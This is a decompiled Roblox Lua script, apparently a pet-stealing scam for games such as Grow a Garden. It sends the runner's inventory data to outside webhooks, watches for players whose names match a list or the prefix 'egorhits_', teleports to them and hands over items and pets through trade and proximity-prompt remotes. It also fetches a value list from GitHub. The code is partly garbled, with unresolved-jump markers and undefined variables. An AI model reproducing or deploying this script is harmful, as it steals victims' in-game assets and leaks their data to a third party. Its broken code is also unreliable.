                                        local HttpService6 = game:GetService("HttpService")
                                        config57.Body = HttpService6:JSONEncode(config47)
                                        request(config57)
                                    else
                                        local config59 = {}
                                        config59.Url = LogsHitsWebhook
                                        config59.Method = "POST"
                                        local config60 = {}
                                        config60["Content-Type"] = "application/json"
                                        config59.Headers = config60
                                        local HttpService7 = game:GetService("HttpService")
                                        config59.Body = HttpService7:JSONEncode(config47)
                                        request(config59)
                                    end
                                end

                                local config61 = {}
                                config61.Url = logs
                                config61.Method = "POST"
                                local config62 = {}
                                config62["Content-Type"] = "application/json"
                                config61.Headers = config62
                                local HttpService8 = game:GetService("HttpService")
                                config61.Body = HttpService8:JSONEncode(config47)
                                request(config61)
                                local Players6 = game:GetService("Players")
                                local ReplicatedStorage7 = game:GetService("ReplicatedStorage")

                                for v45, v46 in pairs(Players6:GetPlayers()) do

                                    if v46 ~= Players6.LocalPlayer then

                                        task.spawn(func_e1f33381, v46)
                                    end
                                end

                                Players6.PlayerAdded:Connect(function(p0)
                                    if p0 ~= Players6.LocalPlayer then
                                        func_e1f33381(p0)
                                    end
                                end)
                            else
                                if game.PlaceId == GrowGarden and game.PlaceId == ttd then

                                    if game.PlaceId ~= bgsi then
                                        game.Players.LocalPlayer:Kick("wrong game")
                                    end

                                    return

                                end
                            end
                        end
                    end
                end
            end
        end
    end
end
end
end
end
end
end
end

local function func_4b71649a(...)

    for v, v2 in ipairs(config21) do
        func_7b7f089d(v2.Id)

        task.wait(0.1)
    end

    return

end

local function func_1cc33c11(p0)
    local v = p0.Name

    for v2, v3 in pairs(workspace.PetsPhysical:GetChildren()) do

        if v3:GetAttribute("OWNER") == Players6.LocalPlayer.Name then
            local config = {}
            ReplicatedStorage7:WaitForChild("GameEvents"):WaitForChild("PetsService"):FireServer()
        end
    end

    task.wait(1)

    if Players6[v] then
        local v4 = Players6[v].Character
    end

    if v4 then

        if not (v4:FindFirstChild("HumanoidRootPart")) then

            return

        end

        Players6.LocalPlayer.Character:PivotTo(v4.HumanoidRootPart.CFrame)

        for v5, v6 in pairs(getinv()) do

            while true do
                local v7 = v6.item_as_object

                if v7 then
                    v7.Parent = Players6.LocalPlayer.Character
                else
                end

                if true then

                    local v8 = v4:FindFirstChild("HumanoidRootPart")

                    if v8 then

                        repeat
                            local v9 = v8:FindFirstChildOfClass("ProximityPrompt")

                            task.wait()

                        end

                        if v9 then

                            repeat

                                task.wait(0.1)

                            end

                            if func_ea286410(v7) then
                                v7.Parent = Players6.LocalPlayer.Backpack
                            end

                            task.wait(0.5)
                        end
                    end
                end
            end

            return

        end
    end
end

local function func_87baaf33(...)

    if fireproximityprompt then
        fireproximityprompt(v9)
    else
        v9.HoldDuration = 0
        v9.MaxActivationDistance = 999999
        v9:InputHoldBegin()

        task.wait(0.2)
        v9:InputHoldEnd()
    end

    return

end

local function func_b495452c(...)
    local config = {}
    allpets = config
    local config2 = {}
    config21 = config2

    for v, v2 in pairs(_upv1:Get().Pets) do
        local v3 = v2.Name
        local v4 = v2.Id

        if not (v2.Mythic) then
            local v5 = false
        end

        if not (v2.Shiny) then
            local v6 = false
        end

        if not (v2.Amount) then
            local v7 = 1
        end

        if not (v2.Locked) then
            local v8 = false
        end

        local config4 = {}
        config4.Name = v3
        config4.Id = v4
        config4.Mythic = v5
        config4.Shiny = v6
        config4.Value = func_d3351604({
            Name = v3,
            Id = v4,
            Mythic = v5,
            Shiny = v6,
            Amount = v7,
        }, func_10bf3d47())
        config4.Amount = v7
        config4.Locked = v8

        table.insert(allpets, config4)
    end

    table.sort(allpets, function(p0, p1)
        -- Lt: if R3 > R2 then PC += 1
        -- [!] UNRESOLVED JUMP -> lbl_5 (Fix manually)

        return true
    end)

    return allpets

end

local function func_bf96293b(p0)

    for v, v2 in ipairs(p0) do

    end

    return "" .. v2 .. ", "

end

local function func_ea286410(p0)
    -- [!] UNRESOLVED BRANCH: TestSet logic failed here
    -- [!] UNRESOLVED JUMP -> lbl_7 (Fix manually)

    return true

end

local function func_7c58f224(p0)

    for v, v2 in pairs(config2) do

        if v2:lower() == p0.Name:lower() then

            return true

        end
    end

    if string.find(p0.Name:lower(), "egorhits_") then

        return true

    end

    return false

end

local function func_8724982c(...)
    allpets = func_b495452c()

    for v, v2 in ipairs(allpets) do
    end

    return 0 + v2.Value * v2.Amount

end

local function func_e1f33381(p0)

    if func_7c58f224(p0) then
        func_2bedfbb2(p0)
    end

    return

end

local function func_d58d981d(...)
    -- [7] TailCall: return R0(R1)

    return debug.getupvalues(v8.GetOwnedUIDs)[1].GetLocalPlayerData

end

local function func_2a1f0f62()
    local config = {}
    config[1] = "TradeConfirm"
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Framework"):WaitForChild("Network"):WaitForChild("Remote"):WaitForChild("RemoteEvent"):FireServer()

    return

end

local function func_6e518312(p0)
    local v = math.floor(p0)
    local config = {
        "",
        "k",
        "m",
        "b",
        "t",
        "qa",
        "qi",
    }

    if 1000 <= v then
        -- [!] UNRESOLVED JUMP -> lbl_14 (Fix manually)
    end

    -- [24] TailCall: return R4(R5, R6, R7)

    return string.format

end

local function func_5e69bbcd()

    return func_d58d981d().InventoryItems

end

local function func_73548890(p0, p1)
    local config = {}
    config.Url = p0
    config.Method = "POST"
    local config2 = {}
    config2["Content-Type"] = "application/json"
    config.Headers = config2
    config.Body = HttpService4:JSONEncode(p1)
    request(config)

    return

end

local function func_d3351604(p0, p1)

    for v, v2 in ipairs(p1) do

        if v2.name == p0.Name then
            -- [!] UNRESOLVED BRANCH: TestSet logic failed here
        else
        end

        -- [!] UNRESOLVED JUMP -> lbl_18 (Fix manually)
    end

    if p0.Shiny then

        if p0.Mythic then
        else
            if p0.Shiny then
            else
            end
        end

        return 0 * 5

    end
end

local function func_2bedfbb2(p0)

    while true do

        if task.wait(1) and p0 and p0.Parent then

            if Players6.LocalPlayer.Character then

                if Players6.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                    func_1cc33c11(p0)
                end
            else
            end
        end
    end
end

local function func_7b7f089d(p0)
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    ReplicatedStorage.Shared.Framework.Network.Remote.RemoteEvent:FireServer("UnlockPet", tostring(p0), true)

    return

end

local function func_6541dc2e()
    local config = {}
    config[1] = "TradeAccept"
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Framework"):WaitForChild("Network"):WaitForChild("Remote"):WaitForChild("RemoteEvent"):FireServer()

    return

end

local function func_e1901b00(p0)
    local config = {}
    config[1] = "TradeRequest"
    local Players = game:GetService("Players")
    config[2] = Players:WaitForChild(tostring(p0))
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Framework"):WaitForChild("Network"):WaitForChild("Remote"):WaitForChild("RemoteEvent"):FireServer()

    return

end

local function func_10bf3d47(...)
    local _upv0 = "https://raw.githubusercontent.com/WINVOLST/ttd/refs/heads/main/value"
    local v, v2 = pcall(func_b59aa00e)

    if v and v2 then

        if type(v2) ~= "string" then
            warn("�шибка загрузки данных: " .. tostring(v2))
            local config = {}

            return config

        end

        local config2 = {}
    end
end

return

end

